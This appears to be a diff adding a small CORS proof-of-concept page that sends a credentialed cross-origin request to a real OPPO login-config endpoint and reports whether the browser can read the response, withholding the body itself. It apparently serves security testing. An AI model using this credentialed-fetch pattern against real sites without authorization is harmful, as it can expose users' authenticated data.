@@ -1,0 +1,55 @@
+<!doctype html>
+<html lang="id">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>CORS Security Validation</title>
+  </head>
+  <body>
+    <h2>CORS PoC — OPPO Login Config</h2>
+    <p>Pengujian keterbacaan response lintas origin.</p>
+    <button id="run">Jalankan pemeriksaan</button>
+    <pre id="result">Belum dijalankan.</pre>
+
+    <script>
+      const endpoint = "https://id-sg.oppo.com/identity/web/v1/config/login";
+
+      document.getElementById("run").onclick = async () => {
+        const output = document.getElementById("result");
+        output.textContent = "Mengirim request GET tanpa body...";
+
+        try {
+          const response = await fetch(endpoint, {
+            method: "GET",
+            credentials: "include",
+          });
+
+          // Jangan tampilkan atau simpan data respons.
+          const body = await response.text();
+
+          output.textContent = JSON.stringify(
+            {
+              browserCanReadResponse: true,
+              status: response.status,
+              contentType: response.headers.get("content-type"),
+              responseLength: body.length,
+              responseReceived: true,
+            },
+            null,
+            2,
+          );
+        } catch (error) {
+          output.textContent = JSON.stringify(
+            {
+              browserCanReadResponse: false,
+              error: String(error),
+              hint: "Periksa DevTools Console dan Network.",
+            },
+            null,
+            2,
+          );
+        }
+      };
+    </script>
+  </body>
+</html>
